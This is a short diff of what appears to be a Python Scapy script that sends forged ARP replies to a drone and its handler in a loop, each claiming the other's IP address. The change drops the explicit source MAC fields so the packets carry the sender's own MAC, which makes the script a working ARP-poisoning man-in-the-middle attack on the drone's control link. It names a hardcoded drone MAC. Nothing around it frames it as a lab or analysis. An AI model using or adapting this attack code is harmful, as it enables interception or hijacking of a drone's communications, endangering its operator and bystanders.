@@ -16,9 +16,9 @@ if __name__ == "__main__":
     drone_mac = '60:60:1f:c4:3d:ba'
     print(get_mac(handler_ip))
 
-    spoof_drone_pkt = ARP(op=2, hwdst=drone_mac, pdst=drone_ip, hwsrc=handler_mac,
+    spoof_drone_pkt = ARP(op=2, hwdst=drone_mac, pdst=drone_ip,
                           psrc=handler_ip)
-    spoof_handler_pkt = ARP(op=2, hwdst=handler_mac, pdst=handler_ip, hwsrc=drone_mac,
+    spoof_handler_pkt = ARP(op=2, hwdst=handler_mac, pdst=handler_ip,
                             psrc=drone_ip)
 
     while True:
